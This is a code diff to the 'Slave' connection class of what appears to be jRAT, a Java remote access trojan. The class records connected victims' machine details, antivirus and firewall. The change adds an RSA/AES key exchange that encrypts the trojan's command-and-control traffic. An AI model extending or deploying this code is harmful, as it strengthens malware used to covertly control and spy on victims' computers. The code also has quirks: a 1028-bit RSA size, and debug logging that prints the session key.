@@ -19,7 +19,7 @@ import io.jrat.common.OperatingSystem;
 import io.jrat.common.Version;
 import io.jrat.common.codec.Hex;
 import io.jrat.common.crypto.Crypto;
-import io.jrat.common.hash.Md5;
+import io.jrat.common.crypto.KeyExchanger;
 import io.jrat.common.hash.Sha1;
 
 import java.awt.TrayIcon;
@@ -30,6 +30,10 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.PrivateKey;
+import java.security.PublicKey;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -60,6 +64,8 @@ public class Slave implements Runnable {
 	private Locale[] locales;
 	private Antivirus[] antiviruses;
 	private Firewall[] firewalls;
+	
+	private byte[] key;
 
 	private String computername = "";
 	private String ip = "";
@@ -108,6 +114,10 @@ public class Slave implements Runnable {
 	public Slave(String ip) {
 		this.ip = ip;
 	}
+	
+	public byte[] getKey() {
+		return key;
+	}
 
 	public void run() {
 		try {
@@ -139,6 +149,19 @@ public class Slave implements Runnable {
 
 			this.dis = new DataInputStream(inputStream);
 			this.dos = new DataOutputStream(outputStream);
+						
+			KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
+			kpg.initialize(1028);
+			KeyPair kp = kpg.genKeyPair();
+			PublicKey publicKey = kp.getPublic();
+			PrivateKey privateKey = kp.getPrivate();
+			
+			KeyExchanger exchanger = new KeyExchanger(dis, dos);
+			key = exchanger.getAESKey(privateKey, publicKey);
+			
+			if (Main.debug) {
+				Main.debug("Encryption key: " + Hex.encode(key));
+			}
 
 			this.outputStream.write(encryption ? 1 : 0);
 
@@ -148,7 +171,7 @@ public class Slave implements Runnable {
 				if (header == 1) {
 					Sha1 sha = new Sha1();
 					
-					String data = sha.hashToString(connection.getPass()) + "&" + Hex.encode(connection.getKey().getKey());
+					String data = connection.getPass();
 
 					byte[] localHash = sha.hash(data);
 					byte[] remoteHash = new byte[20];
@@ -258,7 +281,7 @@ public class Slave implements Runnable {
 
 	public void writeLine(String s) {
 		try {
-			String enc = Crypto.encrypt(s, connection.getKey().getKey());
+			String enc = Crypto.encrypt(s, getKey());
 
 			if (enc.contains("\n")) {
 				enc = "-h " + Hex.encode(s);
@@ -293,7 +316,7 @@ public class Slave implements Runnable {
 			s = s.substring(3, s.length());
 		} else {
 			try {
-				s = Crypto.decrypt(s, connection.getKey().getKey());
+				s = Crypto.decrypt(s, getKey());
 			} catch (Exception e) {
 				e.printStackTrace();
 				s = null;
